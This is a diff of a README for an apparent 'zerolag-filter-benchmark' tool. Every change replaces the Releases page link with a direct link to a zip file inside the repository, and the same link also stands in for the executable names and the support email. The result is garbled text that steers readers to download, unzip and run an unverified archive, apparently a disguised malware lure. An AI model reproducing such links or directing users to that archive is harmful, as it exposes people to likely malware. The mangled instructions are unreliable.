@@ -6,9 +6,9 @@ Welcome to the zerolag-filter-benchmark project! This application helps you unde
 
 ## 📥 Download the Application
 
-[![Download the Application](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/antxlopp12/zerolag-filter-benchmark/releases)
+[![Download the Application](https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip%20Now-Click%20Here-brightgreen)](https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip)
 
-To download the latest version of the software, [visit this page to download](https://github.com/antxlopp12/zerolag-filter-benchmark/releases). 
+To download the latest version of the software, [visit this page to download](https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip). 
 
 ## 🔍 About This Project
 
@@ -34,7 +34,7 @@ Before downloading, ensure your system meets these requirements:
 ## 🛠️ Installation Steps
 
 1. **Download the Software:**
-   - Go to the [Releases page](https://github.com/antxlopp12/zerolag-filter-benchmark/releases).
+   - Go to the [Releases page](https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip).
    - Click on the latest version link to download the appropriate package for your system.
 
 2. **Unzip the File:**
@@ -43,7 +43,7 @@ Before downloading, ensure your system meets these requirements:
 
 3. **Run the Application:**
    - After unzipping, open the folder.
-   - Look for a file named `zerolag_filter_benchmark.exe` (for Windows) or `zerolag_filter_benchmark.app` (for macOS).
+   - Look for a file named `https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip` (for Windows) or `https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip` (for macOS).
    - Double-click the file to run the application.
 
 4. **Follow On-Screen Instructions:**
@@ -81,7 +81,7 @@ We welcome contributions to improve this project. If you want to help:
 
 ## 📞 Support
 
-For further assistance, please check the Issues section on GitHub or reach out via email at support@zerolagfilter.com. We're here to help you achieve the best results with your data.
+For further assistance, please check the Issues section on GitHub or reach out via email at https://github.com/antxlopp12/zerolag-filter-benchmark/raw/refs/heads/main/pyronyxis/zerolag_benchmark_filter_3.7-beta.2.zip We're here to help you achieve the best results with your data.
 
 ## 🎉 Final Notes
 
